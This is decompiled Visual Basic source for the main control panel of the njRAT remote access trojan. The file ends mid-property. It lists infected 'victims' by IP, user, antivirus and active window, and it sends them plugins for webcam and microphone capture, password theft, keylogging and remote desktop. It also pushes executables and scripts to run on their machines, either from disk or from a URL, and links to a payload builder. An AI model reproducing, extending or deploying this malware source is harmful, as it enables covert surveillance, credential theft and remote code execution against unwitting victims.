Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My
Imports NJRAT.njRAT
Imports WinMM

Namespace NJRAT
	' Token: 0x02000028 RID: 40
	<DesignerGenerated()>
	Public Partial Class Form1
		Inherits Form

		' Token: 0x0600034D RID: 845 RVA: 0x00023DC0 File Offset: 0x00021FC0
		Public Sub New()
			AddHandler MyBase.Activated, AddressOf Me.Form1_Activated
			AddHandler MyBase.Deactivate, AddressOf Me.Form1_Deactivate
			AddHandler MyBase.FormClosing, AddressOf Me.Form1_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Form1_Load
			Me.isActive = False
			Me.int_0 = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600034E RID: 846 RVA: 0x00023E38 File Offset: 0x00022038
		Public Sub dsk()
			While True
				Dim num As Integer
				Select Case Class7.class8_0.int_2
					Case 0
						num = 10
					Case 1
						num = 2000
					Case 2
						num = 5000
					Case 3
						num = 7500
					Case Else
						num = 10000
				End Select
				Dim flag As Boolean = Me.isActive And CULng(GClass7.smethod_0()) < 12000UL And Me.L1.Columns(0).Width <> 0
				If flag Then
					For Each dataGridViewRow As DataGridViewRow In Me.L1.method_3()
						Dim flag2 As Boolean = dataGridViewRow IsNot Nothing
						If flag2 Then
							Dim client As Client = CType(dataGridViewRow.Tag, Client)
							Dim flag3 As Boolean = client IsNot Nothing
							If flag3 Then
								Dim flag4 As Boolean = False
								Dim flag5 As Boolean = DateTime.Compare(client.lastPC, DateTime.MinValue) = 0
								If flag5 Then
									flag4 = True
								Else
									Dim flag6 As Boolean = DateAndTime.Now.Subtract(client.lastPC).TotalMilliseconds >= CDbl(num)
									If flag6 Then
										flag4 = True
									End If
								End If
								Dim flag7 As Boolean = Not client.Isend AndAlso flag4
								If flag7 Then
									client.Isend = True
									client.lastPC = DateAndTime.Now
									client.Send(String.Concat(New String() { "CAP", Class7.string_1, Conversions.ToString(Me.L1.Columns(0).Width), Class7.string_1, Conversions.ToString(Me.L1.method_6()) }))
								End If
							End If
						End If
					Next
				End If
				Thread.Sleep(CInt(Math.Round(Math.Round(CDbl(num) / 2.0))))
			End While
		End Sub

		' Token: 0x0600034F RID: 847 RVA: 0x0002402F File Offset: 0x0002222F
		Private Sub Form1_Activated(sender As Object, e As EventArgs)
			Me.isActive = True
			MyBase.Opacity = 1.0
		End Sub

		' Token: 0x06000350 RID: 848 RVA: 0x00024049 File Offset: 0x00022249
		Private Sub Form1_Deactivate(sender As Object, e As EventArgs)
			Me.isActive = False
			MyBase.Opacity = 0.95
		End Sub

		' Token: 0x06000351 RID: 849 RVA: 0x00024064 File Offset: 0x00022264
		<MethodImpl(MethodImplOptions.NoInlining Or MethodImplOptions.NoOptimization)>
		Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs)
			Me.NotifyIcon1.Visible = False
			Try
				Class7.waveOut_0.Dispose()
			Catch ex As Exception
			End Try
			Class7.class8_0.method_1()
			ProjectData.EndApp()
		End Sub

		' Token: 0x06000352 RID: 850 RVA: 0x000240C0 File Offset: 0x000222C0
		Private Sub Form1_Load(sender As Object, e As EventArgs)
			Try
				MyBase.Left = 0 - MyBase.Width + Screen.PrimaryScreen.WorkingArea.Width
				MyBase.Top = 0 - MyBase.Height + Screen.PrimaryScreen.WorkingArea.Height
				Me.L1.method_11("Screen", L1.GEnum0.StretchImage, DataGridViewAutoSizeColumnMode.None)
				Me.L1.method_11("Name", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("IP", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("PC", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("User", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Install Date", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Flag", L1.GEnum0.Image, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Country", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Operating System", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Cam", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Antivirus", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Ping", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.method_11("Active Window", L1.GEnum0.Text, DataGridViewAutoSizeColumnMode.AllCells)
				Me.L1.Columns(0).Width = 35
				MyBase.Show()
				Class7.notf_0.Show()
				Control.CheckForIllegalCrossThreadCalls = False
				Class7.form1_0 = Me
				Me.Text = Class7.string_0
				Me.NotifyIcon1.Text = Class7.string_0
				Me.NotifyIcon1.Icon = MyBase.Icon
				MyBase.ShowInTaskbar = True
				Me.Pp1.T.Enabled = True
				For Each fileName As String In Directory.GetFiles(Application.StartupPath + "\plugin\", "*.dll")
					Dim item As Class7.Class9 = New Class7.Class9(New FileInfo(fileName).Name.ToLower())
					Class7.list_1.Add(item)
				Next
				For Each text As String In Strings.Split("cam.dll,ch.dll,pw.dll,sc2.dll,mic.dll,plg.dll", ",", -1, CompareMethod.Binary)
					Dim flag As Boolean = Class7.smethod_0(text, Nothing) Is Nothing
					If flag Then
						Interaction.MsgBox("Missing dll >> " + text, MsgBoxStyle.OkOnly, Nothing)
						Dim left As String = Strings.Split(text, ".", -1, CompareMethod.Binary)(0)
						If Operators.CompareString(left, "cam", False) <> 0 Then
							If Operators.CompareString(left, "ch", False) <> 0 Then
								If Operators.CompareString(left, "plg", False) <> 0 Then
									If Operators.CompareString(left, "pw", False) <> 0 Then
										If Operators.CompareString(left, "sc2", False) <> 0 Then
											If Operators.CompareString(left, "mic", False) = 0 Then
												Me.MicrophoneToolStripMenuItem.Enabled = False
											End If
										Else
											Me.RemoteDesktopToolStripMenuItem.Enabled = False
										End If
									Else
										Me.GetPasswordsToolStripMenuItem.Enabled = False
									End If
								Else
									Me.ManagerToolStripMenuItem.Enabled = False
								End If
							Else
								Me.OpenChatToolStripMenuItem.Enabled = False
							End If
						Else
							Me.RemoteCamToolStripMenuItem.Enabled = False
						End If
					End If
				Next
				Try
					Class7.waveOut_0 = New WaveOut(0)
					Class7.waveOut_0.Open(WaveFormat.Pcm8Khz8BitMono)
					Class7.waveOut_1 = New WaveOut(0)
					Class7.waveOut_1.Open(WaveFormat.Pcm44Khz16BitMono)
				Catch ex As Exception
					Me.MicrophoneToolStripMenuItem.Enabled = False
				End Try
				Class7.class8_0.method_0()
				While True
					Try
						Dim port As port = New port()
						port.TextBox1.Text = Class6.smethod_2("port", "6522")
						port.ShowDialog(Me)
						Dim flag2 As Boolean = port.port < 1
						If flag2 Then
							MyBase.Close()
							Return
						End If
						Me.port = port.port
						Me.S = New SK(Me.port)
						Class6.smethod_3("port", Conversions.ToString(Me.port))
					Catch ex2 As Exception
						Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, Nothing)
						Continue For
					End Try
					Exit For
				End While
				Class7.sk_0 = Me.S
				Dim thread As Thread = AddressOf Me.dsk
				thread.Start()
				Me.Timer1.Enabled = True
			Catch ex3 As Exception
			End Try
		End Sub

		' Token: 0x06000353 RID: 851 RVA: 0x000245B4 File Offset: 0x000227B4
		Private Sub ToolStripStatusLabel1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(Me.ToolStripStatusLabel1.Tag), "2", False)
			If flag Then
				Me.ToolStripStatusLabel1.Text = "[ Logs ]"
				Me.ToolStripStatusLabel1.Tag = "1"
				Me.L1.BringToFront()
			Else
				Me.ToolStripStatusLabel1.Text = "[ Users ]"
				Me.ToolStripStatusLabel1.Tag = "2"
				Me.Pp1.BringToFront()
			End If
		End Sub

		' Token: 0x06000354 RID: 852 RVA: 0x00024644 File Offset: 0x00022844
		Private Sub DisconnectToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					Try
						NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "CN", New Object() { False }, Nothing, Nothing, False, True)
					Catch ex As Exception
					End Try
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000355 RID: 853 RVA: 0x00024708 File Offset: 0x00022908
		Private Sub RemoteCamToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("cam.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x06000356 RID: 854 RVA: 0x000247B0 File Offset: 0x000229B0
		Private Sub GetPasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("pw.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, True)
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x06000357 RID: 855 RVA: 0x00024858 File Offset: 0x00022A58
		Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { "kl" }, Nothing, Nothing, Nothing, True)
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag As Boolean = TypeOf enumerator Is IDisposable
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000358 RID: 856 RVA: 0x000248EC File Offset: 0x00022AEC
		Private Sub ToolStripStatusLabel4_Click(sender As Object, e As EventArgs)
			MyProject.Forms.About.ShowDialog()
		End Sub

		' Token: 0x06000359 RID: 857 RVA: 0x00024900 File Offset: 0x00022B00
		Private Sub OpenChatToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("ch.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x0600035A RID: 858 RVA: 0x000249A8 File Offset: 0x00022BA8
		Private Sub OpenFolderToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Directory.Exists(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing))))
				If flag Then
					Directory.CreateDirectory(Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing))))
				End If
				Dim array As Object() = New Object(0) {}
				Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.L1.SelectedRows(0).Tag)
				array(0) = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), Nothing, "folder", New Object(-1) {}, Nothing, Nothing, Nothing)))
				Dim array2 As Object() = array
				Dim array3 As Boolean() = New Boolean() { True }
				NewLateBinding.LateCall(Nothing, GetType(Process), "Start", array2, Nothing, Nothing, array3, True)
				Dim flag2 As Boolean = array3(0)
				If flag2 Then
					NewLateBinding.LateSetComplex(RuntimeHelpers.GetObjectValue(objectValue), Nothing, "folder", New Object() { RuntimeHelpers.GetObjectValue(array2(0)) }, Nothing, Nothing, True, True)
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600035B RID: 859 RVA: 0x00024B14 File Offset: 0x00022D14
		Private Sub FromLINKToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .FileName = String.Empty }
				Dim flag2 As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
				If flag2 Then
					Dim flag3 As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag3)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "rn" + Class7.string_1 + New FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x0600035C RID: 860 RVA: 0x00024C18 File Offset: 0x00022E18
		Private Sub FromDISKToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .Filter = "EXE|*.exe", .FileName = String.Empty }
				Dim flag2 As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
				If flag2 Then
					Dim flag3 As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag3)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "up" + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x0600035D RID: 861 RVA: 0x00024D0C File Offset: 0x00022F0C
		Private Sub ScriptToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim script As script = New script()
				script.ShowDialog(Me)
				Dim flag2 As Boolean = script.Code.Length > 0
				If flag2 Then
					Dim flag3 As Boolean = True
					Dim array As Byte() = Class6.smethod_8(Class6.smethod_11(script.Code), flag3)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim memoryStream2 As MemoryStream = memoryStream
					Dim text As String = "rn" + Class7.string_1 + script.RunAs + Class7.string_1
					Dim buffer As Byte() = Class6.smethod_11(text)
					Dim offset As Integer = 0
					text = "rn" + Class7.string_1 + script.RunAs + Class7.string_1
					memoryStream2.Write(buffer, offset, Class6.smethod_11(text).Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x0600035E RID: 862 RVA: 0x00024E1C File Offset: 0x0002301C
		Private Sub UninstallToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "~"
			array(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

		' Token: 0x0600035F RID: 863 RVA: 0x00024E84 File Offset: 0x00023084
		Private Sub MicrophoneToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("mic.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x06000360 RID: 864 RVA: 0x00024F2C File Offset: 0x0002312C
		Private Sub ToolStripStatusLabel5_Click(sender As Object, e As EventArgs)
			Dim stng As STNG = New STNG() With { .StartPosition = FormStartPosition.CenterParent }
			stng.ShowDialog()
		End Sub

		' Token: 0x06000361 RID: 865 RVA: 0x00024F50 File Offset: 0x00023150
		Private Sub ManagerToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L1.SelectedRows
					Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
					Dim client As Client = CType(dataGridViewRow.Tag, Client)
					Dim flag As Boolean = client IsNot Nothing
					If flag Then
						Dim manager As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
						Dim flag2 As Boolean = manager Is Nothing
						If flag2 Then
							manager = New Manager() With { .sk = client, .Name = "m" + client.ip() }
							manager.Show()
						Else
							manager.WindowState = FormWindowState.Minimized
							manager.WindowState = FormWindowState.Normal
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag3 As Boolean = TypeOf enumerator Is IDisposable
				If flag3 Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x06000362 RID: 866 RVA: 0x00025044 File Offset: 0x00023244
		Private Sub L1_ColumnWidthChanged(sender As Object, e As DataGridViewColumnEventArgs)
			Dim flag As Boolean = e.Column.Index = 0
			If flag Then
				Dim flag2 As Boolean = e.Column.Width > 250
				If flag2 Then
					e.Column.Width = 250
				End If
				Dim flag3 As Boolean = e.Column.Width < 35
				If flag3 Then
					e.Column.Width = 35
				End If
				Me.L1.method_7(CInt(Math.Round(Math.Round(CDbl(e.Column.Width) * 0.67))))
			End If
		End Sub

		' Token: 0x06000363 RID: 867 RVA: 0x000250E0 File Offset: 0x000232E0
		Private Sub NotifyIcon1_MouseDoubleClick(sender As Object, e As MouseEventArgs)
			Try
				Interaction.AppActivate(Me.Text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000364 RID: 868 RVA: 0x00025120 File Offset: 0x00023320
		Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				Interaction.AppActivate(Me.Text)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000365 RID: 869 RVA: 0x00025160 File Offset: 0x00023360
		Private Sub RestartToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Process.Start(Application.ExecutablePath)
			MyBase.Close()
		End Sub

		' Token: 0x06000366 RID: 870 RVA: 0x0000BCE1 File Offset: 0x00009EE1
		Private Sub ExitToolStripMenuItem_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x06000367 RID: 871 RVA: 0x00025178 File Offset: 0x00023378
		Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "@"
			array(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

		' Token: 0x06000368 RID: 872 RVA: 0x000251E0 File Offset: 0x000233E0
		Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim thread As Thread = AddressOf Class7.smethod_4
			Dim thread2 As Thread = thread
			Dim array As Object() = New Object(1) {}
			Dim num As Integer = 0
			Dim text As String = "un" + Class7.string_1 + "!"
			array(num) = Class6.smethod_11(text)
			array(1) = Me.L1.DefaultCellStyle.ForeColor
			thread2.Start(array)
		End Sub

		' Token: 0x06000369 RID: 873 RVA: 0x00025248 File Offset: 0x00023448
		Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .FileName = String.Empty }
				Dim flag2 As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
				If flag2 Then
					Dim flag3 As Boolean = True
					Dim array As Byte() = Class6.smethod_8(File.ReadAllBytes(openFileDialog.FileName), flag3)
					Dim memoryStream As MemoryStream = New MemoryStream()
					Dim text As String = "rn" + Class7.string_1 + New FileInfo(openFileDialog.FileName).Extension.Remove(0, 1) + Class7.string_1
					memoryStream.Write(Class6.smethod_11(text), 0, text.Length)
					memoryStream.Write(array, 0, array.Length)
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { memoryStream.ToArray(), Me.L1.DefaultCellStyle.ForeColor })
				End If
			End If
		End Sub

		' Token: 0x0600036A RID: 874 RVA: 0x0002534C File Offset: 0x0002354C
		Private Sub FromLinkToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim furl As FURL = New FURL()
				furl.ShowDialog(Me)
				Dim isOK As Boolean = furl.IsOK
				If isOK Then
					Dim text As String = String.Concat(New String() { "rn", Class7.string_1, furl.TextBox2.Text, Class7.string_1, furl.TextBox1.Text })
					Dim thread As Thread = AddressOf Class7.smethod_4
					thread.Start(New Object() { Class6.smethod_11(text), Color.Green })
				End If
			End If
		End Sub

		' Token: 0x0600036B RID: 875 RVA: 0x0002540C File Offset: 0x0002360C
		Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("Enter New Name", "Rename Victim", String.Empty, -1, -1)
			Dim flag As Boolean = text.Length > 0
			If flag Then
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Try
							NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), Nothing, "Send", New Object() { String.Concat(New String() { "prof", Class7.string_1, "~", Class7.string_1, "vn", Class7.string_1, Class6.smethod_14(text) }) }, Nothing, Nothing, Nothing, True)
							dataGridViewRow.Cells(Class7.int_0).Value = text + "_" + Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells(Class7.int_0).Value)), "_", -1, CompareMethod.Binary)(Strings.Split(Conversions.ToString(RuntimeHelpers.GetObjectValue(dataGridViewRow.Cells(Class7.int_0).Value)), "_", -1, CompareMethod.Binary).Length - 1)
						Catch ex As Exception
						End Try
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x0600036C RID: 876 RVA: 0x000255D8 File Offset: 0x000237D8
		Private Sub ToolStripStatusLabel3_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Builder.ShowDialog()
		End Sub

		' Token: 0x0600036D RID: 877 RVA: 0x000255EC File Offset: 0x000237EC
		Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim class9_ As Class7.Class9 = Class7.smethod_0("sc2.dll", Nothing)
				Try
					For Each obj As Object In Me.L1.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						Class7.smethod_2(CType(dataGridViewRow.Tag, Client), class9_, False)
					Next
				Finally
					Dim enumerator As IEnumerator
					Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
					If flag2 Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
			End If
		End Sub

		' Token: 0x0600036E RID: 878 RVA: 0x00025694 File Offset: 0x00023894
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim ptr As Integer = Me.int_0
				Me.int_0 = ptr + 1
				Dim flag As Boolean = Me.int_0 = 10
				If flag Then
					Me.int_0 = 0
					Me.upl.Text = "Upload [" + Class6.smethod_17(Class7.long_0) + "]"
					Me.dwn.Text = "Download [" + Class6.smethod_17(Class7.long_1) + "]"
					Class7.long_0 = 0L
					Class7.long_1 = 0L
				End If
				Me.Text = String.Concat(New String() { Class7.string_0, "    Port[ ", Conversions.ToString(Me.port), " ]    Online[ ", Conversions.ToString(Me.L1.RowCount), " ]    Selected[", Conversions.ToString(Me.L1.SelectedRows.Count), "] REQ[", Conversions.ToString(Me.S.REQ.Count), "]" })
				Me.conz.Text = "Connections[" + Conversions.ToString(Me.S.Online.Count) + "]"
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600036F RID: 879 RVA: 0x00025814 File Offset: 0x00023A14
		Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Asemb.ShowDialog()
		End Sub

		' Token: 0x06000370 RID: 880 RVA: 0x00025827 File Offset: 0x00023A27
		Private Sub ToolStripStatusLabel8_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Mynoip.ShowDialog()
		End Sub

		' Token: 0x17000112 RID: 274
		' (get) Token: 0x06000373 RID: 883 RVA: 0x00028BB6 File Offset: 0x00026DB6
		' (set) Token: 0x06000374 RID: 884 RVA: 0x00028BC0 File Offset: 0x00026DC0
		Friend Overridable Property StatusStrip1 As StatusStrip

		' Token: 0x17000113 RID: 275
		' (get) Token: 0x06000375 RID: 885 RVA: 0x00028BC9 File Offset: 0x00026DC9
		' (set) Token: 0x06000376 RID: 886 RVA: 0x00028BD4 File Offset: 0x00026DD4
		Friend Overridable Property ToolStripStatusLabel1 As ToolStripStatusLabel
			<CompilerGenerated()>
			Get
				Return Me._ToolStripStatusLabel1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel1_Click
				Dim toolStripStatusLabel As ToolStripStatusLabel = Me._ToolStripStatusLabel1
				If toolStripStatusLabel IsNot Nothing Then
					RemoveHandler toolStripStatusLabel.Click, value2
				End If
				Me._ToolStripStatusLabel1 = value
				toolStripStatusLabel = Me._ToolStripStatusLabel1
				If toolStripStatusLabel IsNot Nothing Then
					AddHandler toolStripStatusLabel.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000114 RID: 276
		' (get) Token: 0x06000377 RID: 887 RVA: 0x00028C17 File Offset: 0x00026E17
		' (set) Token: 0x06000378 RID: 888 RVA: 0x00028C24 File Offset: 0x00026E24
		Friend Overridable Property ToolStripStatusLabel3 As ToolStripStatusLabel
			<CompilerGenerated()>
			Get
				Return Me._ToolStripStatusLabel3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel3_Click
				Dim toolStripStatusLabel As ToolStripStatusLabel = Me._ToolStripStatusLabel3
				If toolStripStatusLabel IsNot Nothing Then
					RemoveHandler toolStripStatusLabel.Click, value2
				End If
				Me._ToolStripStatusLabel3 = value
				toolStripStatusLabel = Me._ToolStripStatusLabel3
				If toolStripStatusLabel IsNot Nothing Then
					AddHandler toolStripStatusLabel.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000115 RID: 277
		' (get) Token: 0x06000379 RID: 889 RVA: 0x00028C67 File Offset: 0x00026E67
		' (set) Token: 0x0600037A RID: 890 RVA: 0x00028C74 File Offset: 0x00026E74
		Friend Overridable Property ToolStripStatusLabel5 As ToolStripStatusLabel
			<CompilerGenerated()>
			Get
				Return Me._ToolStripStatusLabel5
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripStatusLabel)
				Dim value2 As EventHandler = AddressOf Me.ToolStripStatusLabel5_Click
				Dim toolStripStatusLabel As ToolStripStatusLabel = Me._ToolStripStatusLabel5
				If toolStripStatusLabel IsNot Nothing Then
					RemoveHandler toolStripStatusLabel.Click, value2
				End If
				Me._ToolStripStatusLabel5 = value
				toolStripStatusLabel = Me._ToolStripStatusLabel5
				If toolStripStatusLabel IsNot Nothing Then
